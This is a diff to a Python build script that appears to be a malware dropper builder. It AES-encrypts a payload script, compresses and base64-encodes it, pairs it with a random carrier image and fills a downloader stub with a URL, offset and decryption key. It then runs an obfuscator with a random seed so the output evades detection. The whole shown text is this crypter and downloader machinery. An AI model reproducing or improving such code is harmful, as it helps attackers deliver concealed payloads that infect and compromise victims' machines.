@@ -140,9 +140,9 @@ random.shuffle(myendings)
 random.shuffle(mywindows)
 
 cipher = AES.new(key)
-payload = EncodeAES(cipher, readyscript)
-downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(%s).decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,keyvar,bd64var,payload)))
+downpayload = EncodeAES(cipher, readyscript)
 downpayload = base64.b64encode(bz2.compress(downpayload))
+
 image = random.choice(os.listdir("stubs/images"))
 with open('stubs/images/' + image, 'rb') as di:
 	imagedata = di.read()
@@ -166,7 +166,7 @@ else:
 	dlf = 'stubs/downloader_cust.py'
 
 with open(dlf, 'rb') as dl:
-	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var).replace('***URLO***', urlvar).replace('***OFFSET***', str(imagelen))
+	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var).replace('***URLO***', urlvar).replace('***OFFSET***', str(imagelen)).replace('***AESVAR***', AESvar).replace('***AESKEY***', key)
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
 obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
